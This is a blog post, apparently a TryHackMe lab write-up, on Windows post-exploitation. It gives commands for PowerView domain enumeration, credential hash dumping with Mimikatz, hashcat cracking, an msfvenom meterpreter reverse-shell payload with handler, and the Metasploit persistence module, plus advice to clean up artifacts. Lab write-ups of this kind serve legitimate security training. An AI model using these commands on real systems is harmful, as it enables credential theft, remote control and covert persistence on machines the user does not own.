---
date: '2025-02-02T00:07:56+05:30'
draft: false
title: 'Post-Exploitation Basics: Windows Enumeration and Persistence'
slug: post-exp-basics-thm
tags: ["tryhackme", "windows", "post-exploitation", "powershell", "mimikatz"]
category: writeups
showtoc: true
summary: A comprehensive guide to Windows post-exploitation techniques including PowerShell enumeration, Mimikatz usage, and establishing persistence
description: Learn essential Windows post-exploitation techniques including PowerView enumeration, hash dumping with Mimikatz, and maintaining access through persistence modules
---

# Windows Post-Exploitation Basics

## Initial Access

Connect to the Windows machine using SSH/RDP for initial access.

## PowerShell Enumeration

### Setting Up PowerShell Environment
```powershell
powershell -ep bypass
. .\location-of\PowerView.ps1
```

### Key Enumeration Commands
1. Enumerate Domain Users:
```powershell
Get-NetUser | select cn
```

2. Enumerate Domain Groups:
```powershell
Get-NetGroup -GroupName *admin*
```

3. Find Shared Folders:
```powershell
Invoke-ShareFinder
```

4. Operating System Information:
```powershell
Get-NetComputer -fulldata | select operatingsystem
```

For more commands, refer to the [PowerView Cheatsheet](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993).

## Mimikatz Hash Dumping

Mimikatz is used for dumping user credentials within AD networks.

### Process
1. Run mimikatz.exe with administrative privileges

2. Check privileges:
```bash
privilege::debug
```
Successful output should show "Privilege '20' ok"

![Mimikatz Privilege Check](images/post-exp-basics-1.png)

3. Dump hashes:
```bash
lsadump::lsa /patch
```

![Hash Dumping Process](images/post-exp-basics-2.png)

4. Crack obtained hashes:
```bash
hashcat -m 1000 <hash> rockyou.txt
```

![Hash Cracking](images/post-exp-basics-3.png)

## Server Manager Enumeration

When connected via SSH/RDP:
- Use Event Viewer to analyze system logs
- Check for suspicious activities
- Monitor system events

## Maintaining Access

### Creating Persistence

1. Generate payload:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o shell.exe
```

2. Set up Metasploit handler:
```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
```

3. Establish Persistence:
   - Execute payload on target
   - Background the meterpreter session
   - Use persistence module:
```bash
use exploit/windows/local/persistence
set session <number>
run
```

## Best Practices

1. **Documentation**
   - Record all commands executed
   - Document system changes
   - Note discovered credentials

2. **Operational Security**
   - Minimize noise
   - Clean up artifacts
   - Monitor for detection

3. **Risk Management**
   - Backup before changes
   - Test commands when possible
   - Maintain recovery plans

## Tools Used

1. PowerView
   - AD enumeration
   - Network reconnaissance
   - Permission analysis

2. Mimikatz
   - Credential dumping
   - Hash extraction
   - Token manipulation

3. Metasploit
   - Payload generation
   - Handler setup
   - Persistence establishment

## References

1. [PowerView Documentation](https://powersploit.readthedocs.io/en/latest/)
2. [Mimikatz Wiki](https://github.com/gentilkiwi/mimikatz/wiki)
3. [Metasploit Documentation](https://docs.metasploit.com/)
